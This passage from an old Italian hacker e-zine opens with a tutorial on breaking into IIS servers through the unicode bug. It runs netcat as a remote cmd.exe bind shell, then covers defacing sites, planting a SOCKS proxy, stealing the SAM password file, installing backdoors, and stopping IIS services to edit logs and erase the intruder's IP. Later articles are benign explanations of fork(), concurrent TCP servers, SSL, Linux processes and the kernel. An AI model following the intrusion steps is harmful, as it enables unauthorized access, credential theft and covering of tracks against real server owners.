2- Escalation privilege to System user
3- Server Telnet
4- Make a sock 4


In questo tutorial prendo in esame i punti 2 - 3 - 4 se volete avere informazioni 
riguardo al primo trovate una bella guida di Defu su iishack che spiega come usare 
getadmin e sechole, cmq qualcosa ci sarebbe da aggiungere a riguardo ma lo farò nella 
prossima guida ;) ( non incazzatevi ma per modificare non ci occorre essere 
amministratori hihi è ja è proprio così )


============
0x02-Primi passi


Well direi che possiamo iniziare zizi proprio così

Ora possiamo uppare su un server iis magari bacato da unicode un bel telnet 
server tipo Netcat molto utile e pure efficace, dopodiché con questa piccola 
stringa lo eseguiamo da browser specificando il path ovviamente nel quale si 
trova nc.exe+"-l"+"-p"+"696"+"-t"+"-d"+"-e"+"cmd.exe" ( mettiamo i + così 
vengono interpretati correttamente dal server) il nostro serverino telnet 
sarà in listening sulla porta 696 i comandi completi di netcat lo trovate 
sulla rete.

Ora dobbiamo connetterci tramite la porta che abbiamo settato con telnet 
nel nostro caso 696  Connect . . . et voilà ci troviamo nel server che bello 
siamo dentro, ma cosa possiamo fare vi starete chiedendo, bi semplice:

============
0x03-Considerazioni e Svolgimento

Ipotesi:

1) deface
2) installazione di una sock 4
3) fregare un po' di pwd
4) installare un backdoor
5) modificare le nostre tracce

1) se volete fare solo il defaced non vi conviene usare il netcat fate tutto 
direttamente dal browser e dos tramite perl utilizzando il pacchetto 
unitools.tar che trovate su PacketStorm tramite il TFTP (Trivial file Protocol) 
uppate sul server i files che vi servono per modificare i log dopo aver 
defacciato o installato qualche backdoor.

2) Mai pensato di utilizzare un server iis per installarci una sock 4?????
beh semplice sempre con il netcat uppiamo sul server vittima il file rps.exe 
che trovate con google e lo eseguiamo specificando porta per l'help basta che 
eseguite rps.exe e vi dice lui le varie possibilità che avete.

3) per fregare un po' di pwd, prima dovrete diventare amministratori del sistema 
poi andrete a prendere il file SAM (service account manager) dove sono custodite 
gli user e pwd degli utenti del server ricodate in SYSTEM32/CONFIG/ anche queste 
info le trovate sul tutorial di Defu.

4) spero non ci siamo bisogno di spiegazioni di come installare una backdoor su 
una macchina ;)

5) Questo è il punto più importante, modificare il nostro ip che ha segnato IIS 
in WINNT/SYSTEM32/Logfiles/w3svc1/  uppiamo sul server il file che ho trovato in 
rete si chiama httpodbc.dll lo copiamo in c:\inetpub\scripts\ perché è solo qui 
che può essere eseguito questo file chissà come mai :D
Ora abbiamo i privilegi di System USER che possiamo fa? beh possiamo Fermare 
tanti servizi quali WEB, FTP, SMTP, POP, e tanti altri. Non dobbiamo fare altro 
che NET STOP IISADMIN /Y dove iisadmin è l'insieme dei vari servizi /Y dà la 
conferma in automatico che volete applicare quanto richiesto.
ora visto che è il servizio INETINFO.eXE scrittore di log è fermo possiamo con 
tranquillità spostarci nella DIR dei logs cerchiamo il nostro e poi lo 
modifichiamo visto che abbiamo i abbiamo i permessi giusti e lo scrittore è spento.
In conclusione ricordate vi riavviare i servizi utilizzando NET START iisadmin 
uscite e siete salvi l'avete fatta :D Well done


Conclusione

Spero di essere stato abbastanza chiaro se avete domande dubbi o quant'altro mi 
trovate in IRC canali #noflyzone

============
0x04-Ringraziementi


Particolari:
mmh vediamo un po' senz'altro Vicio compagno di avventure, [V]lad basta fottere pwd :D eheh, 
Xpterminator il mio consigliere, BigAlex o BigAway hihi che mi da una mano a installare i 
server in remoto :D bella vulnerabilità START --> CLose session did you remember? ed infine 
pure Mephisto abbiamo un rapporto molto diverso spariamo cazzate in query se lo facessimo 
in chan sareste tutti morti

Altri saluti:
Alla noflyzone-crew, al mitico Lordspirit (grazie per i tips), al canale Hack, 
hackarena, un saluto pure alla mojodo-crew e a Ondaquadra 

------------------------------------<END>--------------------------------------

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-------------------------------------------------------------------------------
-----------------------------------[THEORY]------------------------------------
-------------------------------------------------------------------------------
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=



-------------------------------------<8>---------------------------------------
----------------------------------<Evilcry>------------------------------------
----------------------------------< fork() >-----------------------------------



-------------[La funzione fork() che cos'è è  a che serve?]-----------------

Tengo a dire che  le info. contenute in questa guida sono il risultato della
fusione tra le mie conoscenze e le varie guide che si trovano in giro.

Disclaimer: Non mi ritengo assolutamente responsabile di eventuali danni contro voi
stessi e contro terzi.Io scrivo solo per informare!!!!!

 ******************************
 * Written by:Evilcry         *
 * E-Mail:evilcry@virgilio.it *
 ******************************

+-------------------------------------------------------------------------+
|La data in cui è stato scritto questo mio piccolo articolo               |
|coincide con il 5 aprile,data dell'anniversario di morte del            |
|grandissimo Kurt Cobain ........Hi Kurt riposa in pace,grazie per averci |
|"regalato" la tua musica.......Sleeps with the angels in peace!          |
+-------------------------------------------------------------------------+

Salve a tutti, oggi parleremo della funzione fork(),di cosa sia e di come possa essere usata :=).
La funzione fork() serve per duplicare un processo o
più specificatamente crea una gerarchia dei processi.

#include<unistd.h>
pid_t fork(void);

Questa funzione restituirà:
[1] -1 in caso di errore. Se invece l'esecuzione va a buon fine ritornerà 0,
questo però nel processo figlio ed un valore maggiore di zero "pid process    identifier" nel
processo babbo :).

[2] Fork() è chiamato nel processo padre o parent, ed il valore restituito si  trova sia nel
 processo parent sia nel proc. figlio.

[3] Quando a un processo figlio occorre il PID del padre ,utilizza la funzione getppid(),mentre
getpid() restituisce l'ID del processo figlio.

[4] Quando descrittori di file ,e quindi i socket :),sono aperti dal processo padre prima della
 chiamata a fork, sono condivisi dal figlio in i/o.

[5] Inoltre quando un processo (padre o figlio) è chiuso tramite close(),
la connessione o stream di dati è "gestito" dal processo rimasto.

[6] Per ultimo, ma non meno importante anzi!!,la possibilità che replichi un processo server,
per gestire in parallelo le connessioni che s'instaurano (la mia preferita :P).Ed è proprio di
quest'ultima caratteristica che vi parlerò.

**********************{[(Server TCP concorrente)]}*************************

Spero che tutti sappiate come funziona a grandi linee un server,comunque per
sicurezza :) vi ho fatto questa semplice tabella:

        1) Attendi una connessione
        2) Accetta la connessione
        3) Duplica il processo... uno continuerà nella gestione della
           connessione (punto 4) e l'altro ripartirà dal punto 1
        4) Analizza le richieste del client
        5) Elabora le richieste
	6) Invia i risultati al client
        7) Se ci sono altre richieste vai al punto 4
        8) Termina il processo


La forma più semplice di server non fa che aspettare una richiesta da parte di un client su una
determinata porta TCP, ma può accettare solo una connessione per volta.In quelli più evoluti
come i "Web server",una volta che ricevono una richiesta da parte di un client,utilizzano la
funzione fork() auto duplicandosi (si parla sempre di processi!)in modo da poter,accettare
simultaneamente più connessioni sulla stessa porta.Se osserviamo cosa succede a livello dei
socket vediamo che:

+ Il server chiama le accept passando come argomento il socket listening cioè  in ascolto,e
dopo chiama fork().

+ Il processo padre chiude il connected socket,e ripete l'accept ed il    socket listening.

+ Il descrittore del connected socket,dopo aver restituito l'accept resta    sempre come
processo figlio,disponibile all'I/O con la connessione.Il processo figlio si occupa della
connessione instaurata,mentre quello padre attende nuove connessioni.Il processo figlio
termina la   connessione attraverso close(),inviando cioè una sequenza di FIN.

Praticamente si ha questo:

pid_t pid;int listenfd,connfd;
listenfd=socket(AF_INET,SOCK_STREAM,0);
bind (listenfd,(struct sockaddr*)&Local,sizeof(Local));
listen(listenfd,10);
for(;;) {
connfd=accept(listenfd,(struct sockaddr*)&Cli,&len);
/* Ecco qui la chiamata a fork () */
pid=fork();
if (pid !=0) close(connfd); /* Processo padre */
else { /* Processo Figlio */
close(listenfd);
Usa_una_nuova_connessione_indicata_da_newsockfd(connfd);
close(connfd); exit(0);
 }
  }

 _/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/

Adesso analizziamo cosa succede al livello delle porte,vedendo più in dettaglio il listato
precedente.Se abbiamo un' applicazione server che gira su un host in cui si trovano svariate
interfacce di rete,che attende una connessione sulla porta 6001 da parte di client che vi
accedono attraverso queste .

---------------------------------------------------------------------

listenfd = socket (AF_INET, SOCK_STREAM, 0);
/* collega il socket ad un indirizzo IP locale e una porta TCP locale */
memset ( &Local, 0, sizeof(Local) );
Local.sin_family = AF_INET;
Local.sin_addr.s_addr = htonl(INADDR_ANY); /* wildcard :=) */
Local.sin_port = htons(6001);
bind ( listenfd, (struct sockaddr*) &Local, sizeof(Local));
/* accetta max 100 richieste simultanee di inizio conness., da adesso */
listen(listenfd, 100 );
/* accetta la prima conness. creando un nuovo socket per la conness. */
for( ; ; ){
connfd = accept(listenfd, (struct sockaddr*) &Cli, &len);
pid = fork(); /* Eccolooooooo :=). */
if ( pid !=0 ) /* processo padre */
close ( connfd );
else { /* processo figlio */
close ( listenfd ); /* chiuso il listening socket */
il figlio usa il connected socket ()
close ( connfd );
exit(0);
   }
      }


-------------------[I/O Multiplexing]---------------------------

Esistono vari modi di comunicare, ad esempio: duplex(due utenti comunicano contemporaneamente )
Half-duplex(uno per volta),quello che a noi c'interessa di più il multiplex in pratica più di
due utenti interagiscono tra loro contemporaneamente. Un' applicazione,potrebbe doversi
connettere nello stesso momento a vari tipi di input e di output

Su unix e quindi su linux :=) esistono vari tipi di I/O:

I/O Bloccante.
I/O Non bloccante.
I/O Multiplexing.
I/O Guidato da Signal.
I/O asincrono (Poco usato).

Analizzando ora un modello di I/O standard,noteremo che quando è effettuata una richiesta I/O
tramite una semplice chiamata read() o write () (definite primitive), il controllo non è
restituito al chiamante se non dopo che è finita l' operazione di input o di output, ovvero
la funzione read () ha letto da un buffer di dati dal kernel o la write () ha scritto in
un buffer del kernel.Questa che vi ho spiegato è la modalità standard cioè bloccante, ed
 ora analizzeremo i sui lati negativi :O|

-Quando si chiama la funzione read (), su un descrittore di file o socket,
e i dati non sono già accodati alla coda (perdonate l' italiano :=) )
del kernel,l'applicazione rimane bloccata fino a che i dati non sono  disponibili,
impossibilitando la lettura la lettura di dati pronti sugli  altri descrittori o socket.
Ciò vale anche per write ().

-Un problema simile è causato dalla funzione accept () dei nostri amati socket :=),che
restituisce il controllo solo quando una richiesta di inizio connessione è disponibile,
ovvero quando è andata a buon fine cioè in coda.(Aspetta e spera che già l' ora si avvicina ihih!)

-----------------------[I/O multiplexing part two]-----------------------
Che cosa ne pensate se potessimo "dire" al kernel di avvisarci quando in un sistema di I/O,
avviene una condizione di disponibilità di I/O...o più precisamente quando:

-I dati sono pronti alla lettura in una coda di kernel,e si accede tramite la funzione read ()
che restituirà subito il controllo al "richiedente" dei dati.

-o una coda di output del kernel si svuota e si appresta ad accedere dei dati passati da write ().

-o quando si verifica un errore in I/O e read () o write () restituiscono -1.

-oppure quando un listening socket è pronto a fornire un connected socket,che dobbiamo
intendere come una risposta ad un'accept()  poiché   ha ricevuto una richiesta di connessione
da parte di un client.

Per ora abbiamo finito :=?) spero sia stato interessante,la prossima volta
vi parlerò della funzione select () legata alla funzione fork (),con qualche
simpatica implementazione :DDD

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Saluti a:NoFlyZone-Crew,[]LoRd[V]icio[],BigAlex,[Evil],cyberdude,cyberPk
cityhunter,Quequero,Andrea Geddon,MightyInquisitor,crashes,_1/2Matto.

Mi trovate su irc nei canali:#hack #noflyzone #crack-it #hackmaniaci #asm
#c/c++ e #ondaquadra.Colgo in oltre l'occasione per salutarli tutti.

Un grande fuck senza ritorno:ai Lamers che cazzeggiano col BO  rompono i coglioni a me!,
a quelli che si credono un Dio e in fine ai pedofili,andate a crepare!!!!!! e naturalmente
al più fuckkato di tutti i tempi....Bill Gates :PPPP (ihihihih)


------------------------------------<END>--------------------------------------




-------------------------------------<9>---------------------------------------
-----------------------------------<[Evil]>------------------------------------
-------------------------------------<SSL>-------------------------------------


 Author : [Evil]
 Date : 17/05/2002
 Tutorial name : Secure Socket Layer protocol

 +-------------------------------------------------------------------+
 Legal disclaimer:

 Quello che troverete leggendo il seguito di questo tutorial
 è a solo scopo informativo io non mi ritengo responsabile del
 danno che potrete arrecare a terzi o a voi stessi mettendo in
 pratica quanto scritto.
 +-------------------------------------------------------------------+

 Il protocollo SSL (Secure Socket Layer) è un prodotto di netscape
 (supportato anche da altri browser). Questo protocollo garantisce
 la privacy delle comunicazioni su internet
 e permette di far comunicare un client con un server in modo
 sicuro e privato.E' molto utilizzato per connessioni dove c'è bisogno
 di inviare info molto private come numero di carta di credito ecc..

 Sono molte le cose che rendono sicuro e affidabile questo protocollo
 tra cui:

 Privacy:

 il sistema di crittazione parte da dopo l'handshake fino alla fine
 della connessione poiché anche i dati inviati vengono crittografati
 e per questo viene utilizzata la crittografia simmetrica (DES e RC4)

 DES . DES è l'acronimo di Digital Encryption Standard
       è un algoritmo di criptazione che usa chiavi a 64bit, non
       è un'elevata potenza di calcolo confronto alle attuali..
       nonostante tutto questo algoritmo è molto usato e qualche
       volta con la sua variante Triple-DES che è basata sull'uso
       di DES ripetuto per 3 volte
       Con questo standard il testo in chiaro in input e il testo
       crittato in output hanno una lunghezza standard di 8 bytes.
       Così l'input, deve essere un multiplo di questo blocco
       elementare, se la lunghezza del messaggio non corrisponde
       ad un multiplo di questa grandezza, deve essere imbottito
       di dati, fino ad arrivare alla misura necessaria per operare
       in modo CBC o ECB correttamente.
       La chiave di crittazione è formata da 56 bits casuali e
       8 bits pari, che vanno a comporre una chiave a 64 bits.

 3DES. Questo metodo è figlio del precedente e consiste nell'esecuzione
       del DES per tre volte consecutive, per triplicare il numero di
       bits nella chiave di crittazione; molti sistemi supportano
       questo metodo. Questa tecnica è conosciuta come EDE
       (Encrypt-Decrypt-Encrypt); il processo di decrittazione
       può essere reso compatibile con il precedente, fermando il
       meccanismo a metà.
       Se le tre chiavi usate sono le stesse, il TRIPLE DES è
       equivalente ad una singola crittazione DES;
       con questo metodo un'applicazione che può usare solo il DES,
       può comunicare con un'altra che sta usando il TRIPLE DES.
       Se invece le tre chiavi sono differenti, la decrittazione
       di mezzo disturberà il messaggio opposto ed esso non decritterà
       il primo stadio.


 RC4 . È un algoritmo della RSA Data Security, Inc. Originariamente
       le specifiche progettuali dellRC4 erano segrete, poi sono
       state divulgate in modo anonimo nel 1994.
       Questo algoritmo è molto utilizzato in vari tipi di applicazioni.
       L'RC4 usa la chiave fornita dagli utilizzatori, per produrre
       una sequenza numerica pseudo-casuale;
       essa è legata al vettore XOR con i dati di input.
       Questo significa che le operazioni di crittazione e di
       decrittazione sono identiche.
       Il numero di bit della chiave è variabile:
       va da un minimo di 8 ad un massimo di 2048.
       Il codice usato da questo sistema ha una lunghezza dieci volte
       inferiore rispetto al DES (minore sicurezza), ma il vantaggio
       sta nella velocità di esecuzione (circa 5 volte più veloce).
       Non ci sono attacchi conosciuti nei suoi confronti.
       La versione internazionale dellRC4 a 40 bit è stata violata
       con il metodo a forza bruta in 8 giorni da ben due associazioni.



 Autenticazione:

 Questo processo viene attuato utilizzando la crittografia asimmetrica
 o a chiave pubblica come RSA e DSS in questo modo si è sicuri
 di comunicare direttamente con il server giusto (l'autenticazione è
 richiesta sia dal server sia dal client)

 RSA . RSA è l'acronimo di Rivest Shamir Adelman questo algoritmo è
       considerato molto sicuro se si usano chiavi lunghe come da
       768 bit o 1024, questo algoritmo a chiave pubblica è il più
       usato sia per cifrare sia per le firme digitali..
       il suo funzionamento è simile a questo

       1. A genera due numeri primi grandi p e q ;
       2. A calcola n = p × q e f(n) = (p - 1)(q - 1) ;
       3. A sceglie un numero 1 < e < f(n) tale che gcd(e, f(n)) = 1;
       4. A calcola d = e-1 mod f(n) usando l'algoritmo di Euclide Esteso;
       5. A pubblica n ed e come sua chiave pubblica PA = (e, n).
       6. A conserva n e d come sua chiave privata SA = (d, n).


 DSS . DSS è l'acronimo di Digital Signature Standard non è molto
       affidabile e utilizzato solo per la firma e non è stato ancora
       reso del tutto pubblico.

 SSL è multipiattaforma lavora su win come su solaris con una sola
 differenza tra USA e resto del mondo, infatti nel resto del mondo
 il protocollo SSL è ridotto all'uso di RC4 con chiavi a 40 bit
 (che ha già avuto precedenti tentativi di essere forzato e molti
 di questi andati a buon fine)
 mentre in USA si riconosce un sistema a livello di sicurezza molto
 più alto.

 Handshake e analisi dei processi:

 Innanzi tutto i protocolli usati durante la sequenza di handshake
 sono:

 "SSL Handshake Protocol" per stabilire una sessione tra il client
                          ed il server
 "SSL Change Cipher Spec protocol" per concordare la Cipher Suite per
                                   la sessione.
 "SSL Alert Protocol" per comunicare i messaggi di errore SSL
                      tra client e server.

 Vediamo come funziona una connessione (client -> server) con SSL

 In prima parte il client e il server concordano sulla versione del
 protocollo e sugli algoritmi di crittografia e a questo punto usano
 la crittografia a chiave pubblica per scambiarsi i dati crittati.

 Ora rivediamo il tutto più dettagliatamente

 il client spedisce al server un hello e quest'ultimo risponde
 altrettanto (con un server hello), questo ha un valore
 importante infatti durante questa fase vengono stabiliti:

 protocol version, cipher suite, session ID e compression method

 se durante questa fase qualcosa fallisce o va storta la connessione
 viene interrotta..
 a questo punto il server manda un messaggio di server hello done
 questo per indicare al client che la fase hello message dell'
 handshake è terminata con successo e attende una risposta
 positiva dal client.
 a questo punto si scambieranno i dati di cui sopra abbiamo parlato
 ora la fase di handshake è finita
 durante la connessione il server può mandare svariati hello request
 anche se questi verranno ignorati dal client poiché la fase
 di handshake è già completata, al contrario il client può
 mandare a sua volta dei client hello per rinegoziare i dati
 di una connessione pre-esistente
 un completo esempio di handshake è questo:

 --------------------------------------------------------------------

 Client ------> ClientHello ------> Server
 Client <------ ServerHello <------ Server

 Client <------ Certificate <------ Server
 Client <------ Certificate request <------ Server
 Client <------ ServerHelloDone <------ Server

 Client ------> Certificate ------> Server
 Client ------> Certificate verify ------> Server

 Client ------> ChangeChiperspec ------> Server
 Client ------> Finished ------> Server

 Client <------ ChangeChiperspec <------ Server
 Client <------ Finished <------ Server

 --------------------------------------------------------------------

 Il client hello ha una struttura come questa:

 struct {
 ProtocolVersion client_version;
 Random random;
 SessionID session_id;
 CipherSuite cipher_suites<2..215>;
 CompressionMethod compression_methods<1..27>;
 } ClientHello;

 mentre il server hello ha una struttura coem questa:

 struct {
 ProtocolVersion server_version;
 Random random;
 SessionID session_id;
 CipherSuite cipher_suite;
 CompressionMethod compression_method;
 } ServerHello;

 server_version : contiene la versione del protocollo

 random : è una struttura completamente casuale generata dal server
         che non ha nessuna dipendenza dal messaggio hello dato
         dal client

 compression_method : il metodo di compressione dato dal server

 Una chiper suite è definita da tre componenti:

 - Metodo di scambio della chiave

 - Algoritmo di cifratura per il trasferimento dei dati

 - Message Digest per la creazione del MAC (Message Autentication Code)

 1. Metodo di scambio della chiave :

    Il metodo di scambio della chiave serve per definire come verrà
    concordata in seguito la chiave segreta.
    SSL 2.0 supporta solo lo scambio di chavi RSA mentre la versione
    successiva SSL 3.0 supporta vari algoritmi di scambio...

 2. Algoritmo di cifratura per il trasferimento dei dati

    Per la crittazione dei dati SSL usa algoritmi di crittografia
    simmetrica.
    si possono effettuare ben otto scelte:

    Cifratura di sequenze

       .RC4 con chiave di 40-bit
       .RC4 con chiave di 128-bit

    CBC Cifratura Blocchi

       .RC2 con chiave di 40-bit
       .DES40, DES, 3DES_EDE.
       .Idea
       .Fortezza

    o eventualmente si può non eseguire alcuna cifratura.

 3. Message Digest per la creazione del MAC

    Questo determina come verrà creata l'impronta digitale dal record.
    Le scelte sono tre:

     MD5, con hash a 128-bit
     SHA (Secure Hash Algorithm) con hash a 160-bit

    o anche qui la scelta di non effettuare nessuna impronta.

 - Server certificate

 Per una maggiore sicurezza durante l'handshake il server invia il
 cosiddetto "server certificate" ovvero il certificato che viene inviato
 subito dopo il server hello, se il server non dispone di un certificato
 allora manda un messaggio di server key exchange.
 il server potrebbe anche chiedere un "certificate request" ovvero un
 certificato dal client (anche se questo non succede molto spesso).

 - Client certificate

 Il client dopo avere ricevuto un server hello done manda il suo
 certificato.

 - Secret Premaster message (RSA)

 Il client genera un messaggio premaster di 48 byte usando l'algoritmo a
 chiave pubblica del server che ha una struttura come questo:

 struct {
 ProtocolVersion client_version;
 opaque random[46];
 } PreMasterSecret;

 Client_version e random sono cose già viste prima

 Pre_Master_Secret : è il valore generato a random dal client usato per
                     generare il master secret vero e proprio

 struct {
 public-key-encrypted PreMasterSecret pre_master_secret;
 } EncryptedPreMasterSecret;


 Trasferimento dati :



 SSL = sicurezza? :

 In teoria la risposta dovrebbe essere SI, ma la pratica è cosa ben diversa
 infatti SSL riporta varie falle e può essere "facilmente" (si fa per dire)
 violabile con metodi come:

 - Crittoanalisi

 - Bruteforce

 - Replay

 L'uso di RC4 con chiavi di 40 bit sembrerebbe una cosa poco sicura ed
 infatti lo è .. e qua in Italia è d'obbligo per la legge degli USA
 sull'esportazione degli algoritmi di crittazione.

 Molti altri bachi sono stati scoperti su questo protocollo per tenersi
 aggiornati c'è sempre bugtraq ..

 Prima di lasciarvi volevo dire due ultime cose molto importanti

 1) il protocollo SSL non è un protocollo indipendente ma
    si appoggia ad un'altro protocollo il TCP/IP.


 2) SSL è applicato in molti servizi usati ovunque e molto spesso come
    telnet e ftp:

 SSL-telnet: ftp://ftp.psy.uq.oz.au/pub/Crypto/SSLapps/
 SSL-ftp: ftp://ftp.psy.uq.oz.au/pub/Crypto/SSLapps/




 --------------------------------------------------------------------------

 E questo è tutto, alla prossima..

 Per qualunque dubbio contattatemi la mia e-mail è la seguente:
 umount@hotmail.com

 Un salutone alla crew di cui faccio parte (Noflyzone crew) e a tutti i
 lettori.

------------------------------------<END>--------------------------------------


-------------------------------------<10>---------------------------------------
-----------------------------------<Evilcry>-----------------------------------
----------------------------<Processi di elaborazione>-------------------------


****************************
Autore:Evilcry             *
E-Mail:evilcry@virgilio.it *
****************************

Disclaimer:Questo tutorial è stato scritto a scopo educativo e di ricerca.Il sottoscritto
non si assume nessuna responsabilità circa l'uso di ciò che ne viene fatto delle seguenti
informazioni .


Bien!,Salve a tutti ragazzi la tematica che tratteremo oggi, sembro il
mio prof :-),parlerà dei processi di elaborazione (sotto linux),che cosa
sono e come destreggiarsi con essi :)

Innanzitutto che cos'è un processo??,un processo non è altro che un
singolo programma nel momento in cui viene eseguito.La nascita di un processo
si può avere soltanto se viene chiamato da un altro processo, ovviamente
già esistente :D.Si forma quindi una gerarchia di processi,il processo (root)
che sta al vertice è chiamato init in pratica quello che darà vita agli altri processi.Il processo
init è attivato cioè nasce dal kernel.

*********[Tabella dei processi]***********************

Una delle funzioni del kernel è quella di gestire una tabella di processi,
che serve a tener traccia del loro stato di esecuzione. I valori che si trovano in questa
tabella sono:

-il nome dell'eseguibile in funzione;
-gli eventuali argomenti passati all'eseguibile attraverso una riga di
 comando;

-il numero di identificazione del processo; PID (Process IDentification)
che è un numero preso in un intervallo da 1 a 30000.Il PID di un processo viene assegnato
al momento della sua nascita, quindi dipende dal momento in cui è stato creato.

-il numero di identificazione del processo che ha generato quello a cui si  riferisce;

-il nome del dispositivo di comunicazione se il processo è controllato da un  terminale;

-il numero di identificazione dell'utente;

-il numero di identificazione del gruppo;

Linux mette a nostra disposizione questa tabella,attraverso un filesystem
virtuale montato nella directorty /proc.Tutti i programmi che gestiscono
i processi fanno riferimento a questo filesystem.Andate a guardarlo
pure per curiosità! :=))))

Per vedere lo stato dei processi non è necessario andare a vederli
in /proc, ma basta usare il comando "top" oppure "ps", mi raccomando
senza apici ihihih

***************<[Nascita e morte di un processo]>***************

Prima avevamo detto che un processo nasce quando viene chiamato da uno già esistente,ma
 non solo,infatti può essere chiamato attraverso la funzione fork().

Un processo termina, quando fa una chiamata alla funzione exit(),trasformandosi cosi in zombie
(ihhihi),tocca poi al processo genitore eliminarne tutte le tracce.Il processo genitore per
poter eliminare i suoi processi zombie,deve essere avvisato che ne esiste la necessità
attraverso il segnale SIGCHLD. Questo segnale agisce proprio sulla funzione exit(),se non
dovesse funzionare potete anche inviare manualmente il segnale SIGCHLD, al processo  genitore,
BADATE AL PROCESSO GENITORE!!.In casi non dico estremi ma inusuali potete terminare il processo
 padre.Il processo che è stato ucciso potrebbe avere dei processi figli che in questo caso
vengono affidati init, il padre di tutti i processi :).

****************<[Core-Dump]>******************

Quando un processo termina accidentalmente provoca uno scarico di memoria (permettetemi di
chiamarlo cosi :-]),o core dump.In pratica si ha un file chiamato core, che contiene l'immagine
del processo interrotto.
Questi file servono solo a documentare l'incidente in cui è incappato il processo :-).Se
volete fare una ricerca degli eventuali core che si trovano nel vostro sistema fate:

# find / -name core -type f

MA state attenti perché esistono dei file che si chiamano core ma che non
hanno niente a che vedere con i core dump,quindi OCCHIO!!!!!!!!.

**************<[Comunicazione tra processi]>*************
Quando l'attività di un processo dipende da un altro,ci deve essere una forma di comunicazione
tra i due.Questo viene normalmente chiamato IPC (Inter Process Comunication) da non confondere
con il sistema di comunicazione IPC di system V.I metodi di comunicazione sono i pipe e system
V IPC.

I segnali possono essere definiti come dei "messaggi" elementari che possono essere inviati ad
un processo,informando quest'ultimo di una particolare condizione che si è manifestata,e di
conseguenza una reazione del processo a cui è arrivato il segnale.Può capitare anche che un
programma ignori un segnale.Se volete vedere quali sono i segnali andate a vederli su signal.h
Ma ora passiamo in rassegna i segnali più significativi:

- SIGINT:Questo è un segnale di interruzione,che normalmente viene inviato dalla tastiera
tramite la pressione dei tasti ctrl+c (oppure in linux ctrl+z).SIGINT inoltre è intercettabile.
Mi viene in mente qualche implementazione hiihhihi.

- SIGKILL:Penso che questo segnale sia uno dei più conosciuti,serve letteralmente ad "uccidere"
un processo.Inoltre non è intercettabile.

-SIGHUP:Questo viene definito segnale di aggancio che rappresenta l'interruzione di una
comunicazione tra processi.

Il comando "kill" a differenza di quello che molti pensano, può essere usato per inviare un
qualsiasi segnale conoscendo,il PID del programma.

*************************<[I PIPE]>*****************

Il termine pipe significa tubo infatti serve per redirigere lo standard output di un programma
sullo standard input di un altro.Attraverso una shell è possibile collegare più processi tra di
loro utilizzando una pipeline,come vediamo nell'esempio seguente:

$ last | more

Ogni connessione tra processi può essere effettuata tramite l'uso della barra  | pipe,che
si comporta come un serbatoio provvisorio di dati (definizione del cazzo :=), con accesso
FIFO (FIRST IN FIRST OUT) cioè il primo dato ad essere inserito è il primo ad uscire.

Questi serbatoi FIFO si possono creare esplicitamente senza far ricorso ad una shell,poiché
sono semplicemente dei file definiti FIFO e che possono essere gestiti e creati attraverso
il programma mkfifo.Adesso vi faccio un esempio che comprende tutte le nozioni apprese su le
pipe o più precisamente eseguirò la stessa operazione dell'esempio precedente usando mkfifo.

$ mkfifo  fifo1 fifo2
Crea due file FIFO: fifo1 e fifo2.
$ cat miofile >> fifo &
Invia miofile a fifo1 senza attendere (&).
$ sort < fifo1 >> fifo2 &
Esegue il riordino di quanto ottenuto da fifo1 e invia il risultato a fifo2 senza attendere (&).
$ lpr < fifo2
Accoda la stampa di quanto ottenuto da fifo2.
I file fifo si possono anche chiamare named pipe e si contrappongono alle normali che vengono
definite pipe anonime.

BROKEN PIPE.
Viene definito broken pipe,l'interruzione di un processo all'interno di una pipeline,che
invierà un segnale SIGPIPE e di conseguenza si interromperà.La rottura di una pipe provoca
l'interruzione del flusso di dati,e anche l'interruzione dei programmi a cui era diretto.

SYSTEM V IPC
Il system V IPC è un sistema abbastanza complesso di comunicazione tra processi,che permette
di gestire code di messaggi, semafori :=) e memoria condivisa.


***********************<[SCHEDULING E PRIORITA']***************

La CPU riesce a gestire la moltitudine di processi che ci sono in un o.s. attraverso una
suddivisione del tempo,in maniera che a turno ogni processo possa essere eseguito tutto o in
parte.Il metodo con cui vengono regolati questi turni è lo scheduling ovvero pianificazione
di questi processi.La percentuali di tempo (della CPU) che ogni processo ha a sua disposizione
è regolata dalla priorità espressa da un numero.Il valore che rappresenta questa priorità
è inversamente proporzionale al numero stesso, cioè un valore elevato rappresenta una bassa
priorità quindi meno tempo a disposizione,mentre un valore basso indica una priorità alta
perciò più tempo a sua disposizione.La priorità di esecuzione di un processo è definita in
maniera autonoma da parte del sistema,ma può essere modificata dall'utente sommandogli il
valore definito nice,quindi un valore positivo incrementa la priorità mentre uno negativo
la decrementa.

Bene,per ora abbiamo finito, spero che sia stato interessante e che vi abbia stimolato ad
approfondire le vostre conoscenze su questo argomento,soprattutto sotto al nostro bene amato
linux che tanto ci permette di sperimentare ed imparare :=)ihihi.Ricordatevi che quella che
ho scritto qui è soltanto una "piccola" introduzione a questo vastissimo argomento.Ho fatto
anche qualche accenno al System V IPC,se vi interessa mandatemi una mail (la trovate sopra),
 se avrò abbastanza richieste, sfornerò ihihhihi un articolo su di esso.

PS: Mi trovate anche in irc sui canali #noflyzone,#hackmaniaci e #hack
ed ora .......

Saluti e tnx a :la noflyzone crew che mi ha permesso di partecipare,cityhunter,BIGAlex,cyberdude
e4m, la error404 crew,lord vicio,Xian,[Evil],_1/2matto,Andrea Geddon,Quequero il chan
#noflyzone #hackmaniaci #hack e #crack-it.

------------------------------------<END>--------------------------------------


-------------------------------------<11>---------------------------------------
------------------------------------<reef>-------------------------------------
-----------------------------<Kernel linux: intro>-----------------------------

Il kernel di Linux : ricompilazione , aggiornamento e comprensione delle sue strutture :

Linux in se stesso e' costituito solo dal Kernel, il nucleo centrale del sistema
operativo che controlla il funzionamento di tutta la macchina
Il kernel di Linux e' stato ideato da Linus Torvalds, uno studente finlandese.
Attualmente contribuiscono allo sviluppo di Linux un gran numero di programmatori
di tutto il mondo . Tutto il lavoro e' coordinato e diretto grazie ai veloci
collegamenti permessi dalla rete internet.
I sorgenti del kernel di Linux sono disponibili in rete sia nella versione stabile ,
indicata dall'ultima cifra , che compone il numero della versione , pari , sia nella
versione in via di sviluppo , contrassegnata dall'ultima cifra dispari.

